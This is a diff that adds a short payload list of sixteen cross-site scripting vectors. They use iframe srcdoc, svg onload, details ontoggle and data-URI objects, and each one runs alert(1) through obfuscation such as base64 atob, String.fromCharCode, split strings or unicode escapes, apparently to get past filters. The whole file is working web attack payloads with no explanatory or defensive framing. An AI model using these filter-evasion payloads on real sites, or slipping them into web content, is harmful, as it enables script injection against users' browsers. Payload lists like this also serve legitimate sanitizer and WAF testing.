@@ -1,0 +1,16 @@
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>
+<svg onload='eval(atob("YWxlcnQoMSk="))'></svg>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>
+<svg onload='new Function("ale"+"rt(1)")()'></svg>
+<details open ontoggle='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></details>
+<svg onload='new Function("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")()'></svg>
+<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></svg>
+<details open ontoggle='new Function("al"+"ert(1)")()'></details>
+<svg onload='new Function("eval(String.fromCharCode(97,108,101,114,116,40,49,41))")()'></svg>
+<iframe srcdoc="<object data=data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>>"></iframe>
+<svg onload='new Function(atob("YWxlcnQoMSk="))()'></svg>
+<details open ontoggle='eval(atob("YWxlcnQoMSk="))'></details>
+<iframe srcdoc="<details open ontoggle=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></details>"></iframe>
+<svg onload='new Function(atob("YWxlcnQoMSk="))()'></svg>
+<object data="data:text/html,<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></svg>"></object>
